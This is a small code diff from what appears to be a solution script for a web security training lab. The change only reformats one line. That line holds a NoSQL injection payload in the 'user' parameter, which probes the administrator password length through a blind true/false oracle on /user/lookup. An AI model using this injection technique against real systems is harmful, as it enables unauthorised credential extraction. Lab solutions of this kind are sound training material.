@@ -17,7 +17,9 @@ def solve_lab(session):
     len_pass = 1
     with NoNewline():
         while True:
-            params = {"user": f"administrator' && this.password.length == {len_pass} || '"}
+            params = {
+                "user": f"administrator' && this.password.length == {len_pass} || '"
+            }
             resp = session.get_path("/user/lookup", params=params)
             json = resp.json()
             if "username" not in json:
